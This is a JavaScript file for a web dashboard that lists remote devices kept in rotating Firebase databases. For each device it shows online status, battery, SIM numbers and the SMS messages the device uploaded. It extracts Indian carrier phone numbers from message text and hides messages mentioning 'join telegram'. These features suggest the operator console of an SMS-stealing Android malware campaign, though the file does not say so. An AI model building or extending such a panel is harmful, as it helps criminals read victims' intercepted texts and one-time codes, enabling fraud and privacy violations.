const dbUrlInput = document.getElementById("dbUrl");
const refreshButton = document.getElementById("refreshButton");
const status = document.getElementById("status");
const deviceCount = document.getElementById("deviceCount");
const deviceList = document.getElementById("deviceList");
const deviceSearch = document.getElementById("deviceSearch");
const statusFilters = document.getElementById("deviceStatusFilters");
const showMoreButton = document.getElementById("showMoreDevices");
const databaseNotice = document.getElementById("databaseNotice");
const totalDeviceCount = document.getElementById("totalDeviceCount");
const onlineDeviceCount = document.getElementById("onlineDeviceCount");
const offlineDeviceCount = document.getElementById("offlineDeviceCount");
const deviceCards = new Map();
const deviceMessageData = new Map();
const deviceDetectedNumbers = new Map();
const messageLoadPromises = new Map();
const registeredDeviceCache = new Map();
const registeredDeviceErrors = new Map();
const registeredDeviceLoading = new Set();
const DEVICE_BATCH_SIZE = 6;
let deviceRecords = [];
let visibleDeviceLimit = DEVICE_BATCH_SIZE;
let selectedStatus = "all";
let registeredDeviceIds = new Set();
let registeredDeviceIdsLoaded = false;
let dataGeneration = 0;
let currentDatabaseUrl = "";
let devicesLoading = false;
let databasesLoading = false;
let cardSequence = 0;
let totalDevices = 0;

const carrierNames = String.raw`(?:jio|airtel|vi|vodafone|idea|bsnl)`;
const phoneCandidate = String.raw`(?<![\d])(?:\+?91[\s-]?)?[6-9](?:[\s-]?\d){9}(?!\d)`;
const numberPatterns = [
  new RegExp(String.raw`\b${carrierNames}\s*(?:mobile\s*)?(?:number|no\.?|\u0928\u0902\u092c\u0930)\s*(?:(?:is|:|=|-)\s*)?(${phoneCandidate})`, "i"),
  new RegExp(String.raw`\b(?:mobile|phone)\s*(?:number|no\.?)\s*(?:(?:is|:|=|-)\s*)?(${phoneCandidate})`, "i"),
  new RegExp(String.raw`\b(?:number|no\.?)\s+(?:for|on)\s+${carrierNames}\s*(?:(?:is|:|=|-)\s*)?(${phoneCandidate})`, "i")
];

async function readJson(url) {
  const response = await window.dashboardApiFetch(url);
  const body = await response.text();
  let data;
  try {
    data = body ? JSON.parse(body) : null;
  } catch {
    throw new Error(`The database returned invalid JSON (HTTP ${response.status}).`);
  }
  if (!response.ok) {
    const detail = data && data.error ? `: ${data.error}` : "";
    throw new Error(`Request failed (HTTP ${response.status})${detail}`);
  }
  return data;
}

function formatPingTime(ping) {
  if (!ping || typeof ping.ts !== "number" || !Number.isFinite(ping.ts)) return "Not reported";
  const timestamp = ping.ts < 100000000000 ? ping.ts * 1000 : ping.ts;
  const date = new Date(timestamp);
  if (Number.isNaN(date.getTime())) return "Not reported";
  return new Intl.DateTimeFormat(undefined, {
    dateStyle: "medium",
    timeStyle: "short"
  }).format(date);
}

function makeField(label, value, className) {
  const field = document.createElement("div");
  field.className = "device-field";
  const fieldLabel = document.createElement("span");
  fieldLabel.className = "device-label";
  fieldLabel.textContent = label;
  const fieldValue = document.createElement("span");
  if (className) fieldValue.className = className;
  fieldValue.textContent = value === null || value === undefined || value === ""
    ? "Not reported"
    : String(value);
  field.append(fieldLabel, fieldValue);
  return field;
}

function makeEmptyMessage(text, className) {
  const empty = document.createElement("p");
  empty.className = className || "empty";
  empty.textContent = text;
  return empty;
}

function getMessageText(message) {
  return [message.message, message.body, message.text, message.msg, message.sms]
    .find((value) => typeof value === "string" && value.length > 0) || "";
}

function extractCarrierNumber(message) {
  const text = getMessageText(message);
  for (const pattern of numberPatterns) {
    const match = pattern.exec(text);
    if (!match) continue;
    let digits = match[1].replace(/\D/g, "");
    if (digits.length === 12 && digits.startsWith("91")) digits = digits.slice(2);
    if (digits.length === 10) return { number: digits, evidence: match[0] };
  }
  return null;
}

function makeNumberEvidence(entry) {
  const evidence = document.createElement("section");
  evidence.className = "number-evidence";
  const label = document.createElement("span");
  label.className = "device-label";
  label.textContent = "Detected number";

  if (!entry) {
    const value = document.createElement("span");
    value.textContent = "No labeled number found";
    const note = document.createElement("p");
    note.className = "number-caveat";
    note.textContent = "Only explicit carrier or phone-number phrases are used for this inference.";
    evidence.append(label, value, note);
    return evidence;
  }

  const number = document.createElement("strong");
  number.textContent = entry.number;
  const source = document.createElement("p");
  source.className = "number-source";
  const sourceTime = getMessageTimestamp(entry.key, entry.message);
  const formattedTime = sourceTime instanceof Date
    ? new Intl.DateTimeFormat(undefined, { dateStyle: "medium", timeStyle: "short" }).format(sourceTime)
    : sourceTime;
  source.textContent = `Found in ${entry.message.sender || "message"} · ${formattedTime} · “${entry.evidence}”`;
  const note = document.createElement("p");
  note.className = "number-caveat";
  note.textContent = "Inferred from message text; it may mention a number other than the device’s SIM number.";
  evidence.append(label, number, source, note);
  return evidence;
}

function getMessageTimestamp(key, message) {
  const candidates = [message.timestamp, message.id, key];
  for (const candidate of candidates) {
    const numeric = typeof candidate === "number" ? candidate : /^\d+$/.test(String(candidate)) ? Number(candidate) : NaN;
    if (!Number.isFinite(numeric)) continue;
    const milliseconds = Math.abs(numeric) < 100000000000 ? numeric * 1000 : numeric;
    const date = new Date(milliseconds);
    if (!Number.isNaN(date.getTime())) return date;
  }
  if (typeof message.dateTime === "string" && message.dateTime.trim()) {
    const parsed = Date.parse(message.dateTime);
    if (Number.isFinite(parsed)) return new Date(parsed);
    return message.dateTime;
  }
  return "Unknown time";
}

function makeMessageRow(key, message, isLatest) {
  const row = document.createElement("article");
  row.className = "message";
  const meta = document.createElement("div");
  meta.className = "message-meta";

  const time = getMessageTimestamp(key, message);
  const timeLabel = document.createElement("time");
  if (time instanceof Date) {
    timeLabel.dateTime = time.toISOString();
    timeLabel.textContent = new Intl.DateTimeFormat(undefined, {
      dateStyle: "medium",
      timeStyle: "short"
    }).format(time);
  } else {
    timeLabel.textContent = time;
  }
  meta.append(timeLabel);

  if (typeof message.sender === "string" && message.sender.trim()) {
    const sender = document.createElement("span");
    sender.className = "message-sender";
    sender.textContent = `From: ${message.sender}`;
    meta.append(sender);
  }
  if (typeof message.type === "string" && message.type.trim()) {
    const type = document.createElement("span");
    type.textContent = message.type;
    meta.append(type);
  }
  if (isLatest) {
    const latest = document.createElement("span");
    latest.className = "latest-badge";
    latest.textContent = "Latest message";
    meta.append(latest);
  }

  const body = document.createElement("p");
  body.className = "message-body";
  body.textContent = getMessageText(message) || "No message text";
  row.append(meta, body);
  return row;
}

function getMessageEntries(messages) {
  if (!messages || typeof messages !== "object" || Array.isArray(messages)) return [];
  return Object.entries(messages)
    .filter(([, message]) => message
      && typeof message === "object"
      && !Array.isArray(message)
      && !/\bjoin[\s\W_]*telegram\b/i.test(getMessageText(message)))
    .sort(compareMessagesNewestFirst);
}

function compareMessagesNewestFirst([leftKey, left], [rightKey, right]) {
  const leftTime = getMessageTimestamp(leftKey, left);
  const rightTime = getMessageTimestamp(rightKey, right);
  const leftValue = leftTime instanceof Date ? leftTime.getTime() : null;
  const rightValue = rightTime instanceof Date ? rightTime.getTime() : null;
  if (leftValue !== null && rightValue !== null) {
    return rightValue - leftValue || String(rightKey).localeCompare(String(leftKey), undefined, { numeric: true });
  }
  if (leftValue !== null) return -1;
  if (rightValue !== null) return 1;
  return String(rightKey).localeCompare(String(leftKey), undefined, { numeric: true });
}

function normalizeDatabaseUrl(value) {
  let url;
  try {
    url = new URL(value);
  } catch {
    throw new Error("Choose a valid Firebase database URL.");
  }
  const isFirebaseHost = url.hostname.endsWith(".firebaseio.com") || url.hostname.endsWith(".firebasedatabase.app");
  if (url.protocol !== "https:" || !isFirebaseHost || url.username || url.password || url.port || url.search || url.hash) {
    throw new Error("Use an HTTPS Firebase database root URL.");
  }
  url.pathname = url.pathname.replace(/\/+$/, "");
  return url.toString().replace(/\/$/, "");
}

function setStatus(message, isError = false) {
  status.textContent = message;
  status.classList.toggle("error", isError);
}

function emptyState(title, description) {
  const empty = document.createElement("div");
  empty.className = "device-empty";
  const heading = document.createElement("h3");
  const text = document.createElement("p");
  heading.textContent = title;
  text.textContent = description;
  empty.append(heading, text);
  return empty;
}

function resetDeviceList() {
  deviceCards.clear();
  deviceMessageData.clear();
  deviceDetectedNumbers.clear();
  messageLoadPromises.clear();
  registeredDeviceCache.clear();
  registeredDeviceErrors.clear();
  registeredDeviceLoading.clear();
  registeredDeviceIds = new Set();
  registeredDeviceIdsLoaded = false;
  deviceRecords = [];
  visibleDeviceLimit = DEVICE_BATCH_SIZE;
  selectedStatus = "all";
  statusFilters.querySelectorAll("button").forEach((button) => {
    button.disabled = true;
    button.setAttribute("aria-pressed", String(button.dataset.status === "all"));
  });
  showMoreButton.hidden = true;
  deviceList.replaceChildren();
  deviceSearch.value = "";
  deviceSearch.disabled = true;
  totalDevices = 0;
  deviceCount.textContent = "";
  totalDeviceCount.textContent = "—";
  onlineDeviceCount.textContent = "—";
  offlineDeviceCount.textContent = "—";
}

function getDeviceName(record) {
  const values = [record.registered.deviceName, record.registered.model, record.registered.deviceModel, record.registered.name,
    record.client.deviceName, record.client.model, record.client.deviceModel, record.client.name];
  return values.find((value) => typeof value === "string" && value.trim())?.trim() || record.id;
}

function getReportedPhones(device) {
  const phones = new Map();
  const add = (value, label) => {
    if (!["string", "number"].includes(typeof value)) return;
    const text = String(value).trim();
    const digits = text.replace(/\D/g, "");
    if (!/^[+()\-\s.\d]+$/.test(text) || digits.length < 7 || digits.length > 15) return;
    if (!phones.has(digits) || (phones.get(digits).label === "Phone" && label !== "Phone")) phones.set(digits, { number: text, label });
  };
  const visit = (value, label = "Phone") => {
    if (!value || typeof value !== "object") { add(value, label); return; }
    if (Array.isArray(value)) { value.forEach((item, index) => visit(item, label === "Phone" ? label : `SIM ${index + 1}`)); return; }
    for (const [key, item] of Object.entries(value)) {
      const sim = /^sim[ _-]?([12])(?:number|phone)?$/i.exec(key);
      if (sim) visit(item, `SIM ${sim[1]}`);
      else if (/^(?:sims|simcards|subscriptions)$/i.test(key)) {
        if (Array.isArray(item)) item.forEach((entry, index) => visit(entry, `SIM ${index + 1}`));
        else if (item && typeof item === "object") Object.entries(item).forEach(([slot, entry]) => visit(entry, /^\d+$/.test(slot) ? `SIM ${Number(slot) + 1}` : "Phone"));
      } else if (/^(?:phone(?:numbers?)?|mobile(?:number)?|number|msisdn|line1number|rawnumber|cleannumber)$/i.test(key)) {
        if (Array.isArray(item)) item.forEach((entry) => add(entry, label));
        else add(item, label);
      }
    }
  };
  visit(device);
  return [...phones.values()];
}

function getDeviceState(record) {
  if (!record.clientStatusAvailable) return "unknown";
  return record.client.status === true ? "online" : "offline";
}

function updateDeviceMetadata(card, record) {
  const name = getDeviceName(record);
  const identity = document.createElement("div");
  identity.className = "device-identity";
  const title = document.createElement("h3");
  title.className = "device-title";
  title.id = card.getAttribute("aria-labelledby");
  title.textContent = name;
  identity.append(title);
  if (name !== record.id) {
    const id = document.createElement("span");
    id.className = "device-record-id";
    id.textContent = record.id;
    identity.append(id);
  }
  const state = document.createElement("span");
  const deviceState = getDeviceState(record);
  card.dataset.state = deviceState;
  state.className = `device-state ${deviceState}`;
  state.textContent = { online: "Online", offline: "Offline", unknown: "Unknown" }[deviceState];
  card.querySelector(".device-card-header").replaceChildren(identity, state);

  const battery = record.client.battery ?? record.registered.battery;
  const batteryValue = typeof battery === "number" ? battery : typeof battery === "string" && /^\d+(?:\.\d+)?%?$/.test(battery.trim()) ? Number(battery.trim().replace("%", "")) : null;
  const reportedBattery = batteryValue !== null && Number.isFinite(batteryValue) && batteryValue >= 0 && batteryValue <= 100;
  const batteryField = makeField("Battery", reportedBattery ? `${Math.round(batteryValue)}%` : "Not reported");
  const batteryText = batteryField.lastElementChild;
  batteryText.className = `device-battery${reportedBattery && batteryValue <= 20 ? " low" : ""}`;
  const batteryIcon = document.createElementNS("http://www.w3.org/2000/svg", "svg");
  batteryIcon.setAttribute("class", "icon");
  batteryIcon.setAttribute("viewBox", "0 0 24 24");
  batteryIcon.setAttribute("aria-hidden", "true");
  batteryIcon.innerHTML = '<rect x="2" y="7" width="17" height="10" rx="2"/><path d="M22 10v4"/>';
  if (reportedBattery) batteryText.prepend(batteryIcon);
  card.querySelector(".device-telemetry").replaceChildren(batteryField, makeField("Last seen", formatPingTime(record.client.ping)));

  const phones = getReportedPhones(record.registered);
  const phoneList = card.querySelector(".device-phones");
  const phoneStatus = card.querySelector(".device-phone-missing");
  phoneList.replaceChildren(...phones.map(({ label, number }) => {
    const row = document.createElement("div");
    row.className = "device-phone";
    const term = document.createElement("dt");
    const value = document.createElement("dd");
    term.textContent = label;
    value.textContent = number;
    row.append(term, value);
    return row;
  }));
  phoneList.hidden = !phones.length;
  phoneStatus.hidden = Boolean(phones.length);
  const registrationError = registeredDeviceErrors.get(record.id);
  phoneStatus.classList.toggle("message-error", Boolean(registrationError));
  if (registrationError) {
    phoneStatus.textContent = `Could not load phone number: ${registrationError}`;
  } else if (registeredDeviceIds.has(record.id) && !registeredDeviceCache.has(record.id)) {
    phoneStatus.textContent = "Loading phone number…";
  } else {
    phoneStatus.textContent = "No phone number reported.";
  }
  card.dataset.searchText = [name, record.id, ...phones.map(({ number }) => number)].join(" ").toLocaleLowerCase();
}

async function loadVisibleDeviceDetails(records, database, generation) {
  const pendingRecords = records.filter((record) => registeredDeviceIds.has(record.id)
    && !registeredDeviceCache.has(record.id)
    && !registeredDeviceErrors.has(record.id)
    && !registeredDeviceLoading.has(record.id));
  for (const record of pendingRecords) {
    registeredDeviceLoading.add(record.id);
    const card = deviceCards.get(record.id);
    if (card) updateDeviceMetadata(card, record);
  }

  let detailsUpdated = false;
  await Promise.all(pendingRecords.map(async (record) => {
    try {
      const query = new URLSearchParams({ database, recordKey: record.id });
      const registered = await readJson(`/api/device-record?${query}`);
      if (generation !== dataGeneration || database !== currentDatabaseUrl || !registeredDeviceIds.has(record.id)) return;
      if (registered !== null && (typeof registered !== "object" || Array.isArray(registered))) {
        throw new Error("The registered device record is not an object.");
      }
      const details = registered || {};
      registeredDeviceCache.set(record.id, details);
      const currentRecord = deviceRecords.find((item) => item.id === record.id) || record;
      currentRecord.registered = details;
      currentRecord.searchText = [getDeviceName(currentRecord), record.id, ...getReportedPhones(details).map(({ number }) => number)]
        .join(" ").toLocaleLowerCase();
      detailsUpdated = true;
      const card = deviceCards.get(record.id);
      if (card) updateDeviceMetadata(card, currentRecord);
    } catch (error) {
      if (generation !== dataGeneration || database !== currentDatabaseUrl || !registeredDeviceIds.has(record.id)) return;
      registeredDeviceErrors.set(record.id, error.message);
      detailsUpdated = true;
      const card = deviceCards.get(record.id);
      const currentRecord = deviceRecords.find((item) => item.id === record.id) || record;
      if (card) updateDeviceMetadata(card, currentRecord);
    } finally {
      if (generation === dataGeneration) registeredDeviceLoading.delete(record.id);
    }
  }));
  if (detailsUpdated && generation === dataGeneration && deviceSearch.value.trim()) filterDeviceCards();
}

function makeDeviceCard(record) {
  const card = document.createElement("article");
  card.className = "device-card";
  card.setAttribute("aria-labelledby", `device-title-${++cardSequence}`);
  card.innerHTML = '<div class="device-card-header"></div><div class="device-telemetry"></div><dl class="device-phones"></dl><p class="device-phone-missing">No phone number reported.</p><details class="message-section"><summary class="message-summary">Messages</summary><div class="number-evidence" hidden></div><div class="message-list"></div></details>';
  const details = card.querySelector(".message-section");
  details.addEventListener("toggle", () => {
    if (!details.open || !currentDatabaseUrl) return;
    loadDeviceMessages(record.id, card, currentDatabaseUrl, dataGeneration).catch(() => {});
  });
  return card;
}

function filterDeviceCards() {
  const query = deviceSearch.value.trim().toLocaleLowerCase();
  const matching = deviceRecords.filter((record) =>
    (selectedStatus === "all" || getDeviceState(record) === selectedStatus)
    && `${record.searchText} ${deviceDetectedNumbers.get(record.id) || ""}`.includes(query));
  const visibleRecords = matching.slice(0, visibleDeviceLimit);
  const visibleIds = new Set(visibleRecords.map((record) => record.id));
  for (const [id, card] of deviceCards) {
    if (visibleIds.has(id)) continue;
    card.remove();
    deviceCards.delete(id);
    messageLoadPromises.delete(id);
  }
  deviceList.querySelectorAll(".device-empty").forEach((empty) => empty.remove());
  for (const [index, record] of visibleRecords.entries()) {
    const card = deviceCards.get(record.id) || makeDeviceCard(record);
    updateDeviceMetadata(card, record);
    deviceCards.set(record.id, card);
    // Keep existing disclosures and keyboard focus intact when adding a batch.
    if (deviceList.children[index] !== card) deviceList.insertBefore(card, deviceList.children[index] || null);
  }
  if (!matching.length && totalDevices) {
    const empty = emptyState("No matching devices", "Try another status or search. Clear the search and show more to load additional phone numbers.");
    empty.classList.add("search-empty");
    deviceList.append(empty);
  } else if (!totalDevices) {
    deviceList.append(emptyState("No devices in this database", "Select another database or refresh after a device connects."));
  }
  const visible = visibleRecords.length;
  deviceCount.textContent = visible < matching.length
    ? `${visible} of ${matching.length} devices`
    : `${visible} device${visible === 1 ? "" : "s"}`;
  showMoreButton.hidden = visible >= matching.length;
  showMoreButton.setAttribute("aria-label", `Show ${Math.min(DEVICE_BATCH_SIZE, matching.length - visible)} more devices`);
  loadVisibleDeviceDetails(visibleRecords, currentDatabaseUrl, dataGeneration)
    .catch((error) => setStatus(error.message, true));
}

function renderDevices(clients, clientStatusAvailable) {
  const records = new Map();
  const validEntries = (data) => Object.entries(data || {}).filter(([, value]) => value && typeof value === "object" && !Array.isArray(value));
  for (const id of registeredDeviceIds) {
    records.set(id, {
      id,
      registered: registeredDeviceCache.get(id) || {},
      client: {},
      clientStatusAvailable
    });
  }
  for (const [id, client] of validEntries(clients)) {
    records.set(id, {
      id,
      client,
      registered: registeredDeviceIds.has(id) ? registeredDeviceCache.get(id) || {} : {},
      clientStatusAvailable
    });
  }
  const sortedRecords = [...records.values()].sort((left, right) => left.id.localeCompare(right.id));
  for (const record of sortedRecords) {
    record.searchText = [getDeviceName(record), record.id, ...getReportedPhones(record.registered).map(({ number }) => number)].join(" ").toLocaleLowerCase();
  }
  deviceRecords = sortedRecords;
  totalDevices = sortedRecords.length;
  totalDeviceCount.textContent = totalDevices;
  onlineDeviceCount.textContent = sortedRecords.filter((record) => getDeviceState(record) === "online").length;
  offlineDeviceCount.textContent = clientStatusAvailable ? sortedRecords.filter((record) => getDeviceState(record) === "offline").length : "—";
  if (!clientStatusAvailable) onlineDeviceCount.textContent = "—";
  for (const id of deviceMessageData.keys()) {
    if (!records.has(id)) { deviceMessageData.delete(id); deviceDetectedNumbers.delete(id); }
  }
  filterDeviceCards();
}

async function loadDeviceMessages(deviceId, card, database, generation) {
  const pending = messageLoadPromises.get(deviceId);
  if (pending) return pending;
  const list = card.querySelector(".message-list");
  const summary = card.querySelector(".message-summary");
  list.setAttribute("aria-busy", "true");
  if (!deviceMessageData.has(deviceId)) list.replaceChildren(makeEmptyMessage("Loading messages…"));
  const request = (async () => {
    try {
      const query = new URLSearchParams({ database, deviceId });
      const messages = await readJson(`/api/device-messages?${query}`);
      if (generation !== dataGeneration || deviceCards.get(deviceId) !== card) return;
      const entries = getMessageEntries(messages);
      deviceMessageData.set(deviceId, entries);
      summary.textContent = `Messages (${entries.length})`;
      list.replaceChildren(...(entries.length ? entries.map(([key, message], index) => makeMessageRow(key, message, index === 0)) : [makeEmptyMessage("No messages for this device.")]));
      const latestNumber = entries.map(([key, message]) => {
        const detected = extractCarrierNumber(message);
        return detected ? { key, message, ...detected } : null;
      }).find(Boolean);
      const evidence = makeNumberEvidence(latestNumber);
      deviceDetectedNumbers.set(deviceId, latestNumber?.number || "");
      evidence.hidden = !latestNumber;
      card.querySelector(".number-evidence").replaceWith(evidence);
      filterDeviceCards();
    } catch (error) {
      if (generation !== dataGeneration || deviceCards.get(deviceId) !== card) return;
      summary.textContent = "Messages unavailable";
      list.replaceChildren(makeEmptyMessage(error.message, "message-error"));
    } finally {
      list.removeAttribute("aria-busy");
    }
  })();
  messageLoadPromises.set(deviceId, request);
  return request.finally(() => {
    if (messageLoadPromises.get(deviceId) === request) messageLoadPromises.delete(deviceId);
  });
}

async function readDeviceSection(section, database, shallow = false) {
  const query = new URLSearchParams({ section, database });
  if (shallow) query.set("shallow", "true");
  const data = await readJson(`/api/data?${query}`);
  if (data !== null && (typeof data !== "object" || Array.isArray(data))) throw new Error(`The ${section} section is not a collection of records.`);
  return data;
}

async function loadDevices(background = false) {
  if (background && (devicesLoading || databasesLoading || document.visibilityState !== "visible" || !currentDatabaseUrl)) return;
  let database;
  try { database = normalizeDatabaseUrl(dbUrlInput.value); }
  catch (error) { setStatus(error.message, true); return; }
  const generation = background ? dataGeneration : ++dataGeneration;
  const databaseChanged = currentDatabaseUrl !== database;
  if (databaseChanged) resetDeviceList();
  else if (!background) {
    registeredDeviceCache.clear();
    registeredDeviceErrors.clear();
    registeredDeviceLoading.clear();
  }
  if (!background) messageLoadPromises.clear();
  currentDatabaseUrl = database;
  devicesLoading = true;
  refreshButton.disabled = true;
  deviceList.setAttribute("aria-busy", "true");
  if (!background) setStatus("Loading devices…");
  try {
    const [clients, devices] = await Promise.allSettled([
      readDeviceSection("clients", database),
      background && registeredDeviceIdsLoaded
        ? Promise.resolve(registeredDeviceIds)
        : readDeviceSection("devices", database, true)
    ]);
    if (generation !== dataGeneration || database !== dbUrlInput.value) return;
    if (devices.status === "fulfilled") {
      const nextDeviceIds = devices.value instanceof Set
        ? devices.value
        : new Set(Object.keys(devices.value || {}));
      for (const id of registeredDeviceCache.keys()) {
        if (!nextDeviceIds.has(id)) registeredDeviceCache.delete(id);
      }
      registeredDeviceIds = nextDeviceIds;
      registeredDeviceIdsLoaded = true;
    }
    if (clients.status === "rejected" && devices.status === "rejected") throw new Error(clients.reason.message);
    const partial = clients.status === "rejected" || devices.status === "rejected";
    renderDevices(clients.status === "fulfilled" ? clients.value : null, clients.status === "fulfilled");
    deviceSearch.disabled = false;
    statusFilters.querySelectorAll("button").forEach((button) => { button.disabled = false; });
    if (partial) {
      setStatus(clients.status === "rejected" ? "Device status is unavailable. Showing registered devices with unknown status." : "Registered device details are unavailable. Showing devices reported by clients.", true);
    } else setStatus("");
    const openedCards = [...deviceCards.entries()].filter(([, card]) => card.querySelector(".message-section").open);
    await Promise.allSettled(openedCards.map(([id, card]) => loadDeviceMessages(id, card, database, generation)));
  } catch (error) {
    if (generation !== dataGeneration) return;
    if (!deviceCards.size) deviceList.replaceChildren(emptyState("Could not load devices", "Try Refresh or choose another database."));
    setStatus(error.message, true);
  } finally {
    if (generation === dataGeneration) {
      devicesLoading = false;
      refreshButton.disabled = false;
      deviceList.setAttribute("aria-busy", "false");
    }
  }
}

async function loadDatabases() {
  if (databasesLoading) return;
  databasesLoading = true;
  refreshButton.disabled = true;
  dbUrlInput.disabled = true;
  const preferred = dbUrlInput.value;
  try {
    const [config, rotation] = await Promise.allSettled([readJson("/api/config"), readJson("/api/rotation")]);
    const candidates = rotation.status === "fulfilled" && Array.isArray(rotation.value.databaseUrls) ? rotation.value.databaseUrls : [];
    const defaultUrl = config.status === "fulfilled" ? config.value.databaseUrl : null;
    const configured = candidates.length ? candidates : [defaultUrl];
    const urls = [];
    for (const value of configured) {
      try { const url = normalizeDatabaseUrl(value); if (!urls.includes(url)) urls.push(url); }
      catch { /* Invalid saved entries cannot become selectable database URLs. */ }
    }
    if (!urls.length && defaultUrl) {
      try { urls.push(normalizeDatabaseUrl(defaultUrl)); } catch { /* The error below provides the recovery action. */ }
    }
    if (!urls.length) throw new Error(config.status === "rejected" && rotation.status === "rejected" ? "Could not load database settings. Try Refresh." : "No valid databases configured. Add a database on the Rotation page.");
    dbUrlInput.replaceChildren(...urls.map((url) => new Option(url, url)));
    dbUrlInput.value = urls.includes(preferred) ? preferred : urls.includes(defaultUrl) ? defaultUrl : urls[0];
    databaseNotice.hidden = rotation.status === "fulfilled";
    databaseNotice.textContent = rotation.status === "rejected" ? "Saved database list unavailable. Showing the configured default." : "";
    dbUrlInput.disabled = false;
    await loadDevices();
  } catch (error) {
    dbUrlInput.replaceChildren(new Option("Databases unavailable", ""));
    resetDeviceList();
    deviceList.append(emptyState("No database selected", "Use Refresh to retry, or configure a database on the Rotation page."));
    deviceList.setAttribute("aria-busy", "false");
    setStatus(error.message, true);
  } finally {
    databasesLoading = false;
    refreshButton.disabled = false;
  }
}

dbUrlInput.addEventListener("change", () => loadDevices());
deviceSearch.addEventListener("input", () => {
  visibleDeviceLimit = DEVICE_BATCH_SIZE;
  filterDeviceCards();
});
statusFilters.addEventListener("click", (event) => {
  const button = event.target.closest("button[data-status]");
  if (!button || button.disabled) return;
  selectedStatus = button.dataset.status;
  visibleDeviceLimit = DEVICE_BATCH_SIZE;
  statusFilters.querySelectorAll("button").forEach((filter) => {
    filter.setAttribute("aria-pressed", String(filter === button));
  });
  filterDeviceCards();
});
showMoreButton.addEventListener("click", () => {
  const previousCount = deviceCards.size;
  visibleDeviceLimit += DEVICE_BATCH_SIZE;
  filterDeviceCards();
  const firstNewTitle = deviceList.querySelectorAll(".device-title")[previousCount];
  if (firstNewTitle) {
    firstNewTitle.setAttribute("tabindex", "-1");
    firstNewTitle.focus();
  }
});
refreshButton.addEventListener("click", loadDatabases);
setInterval(() => loadDevices(true), 30000);
loadDatabases();
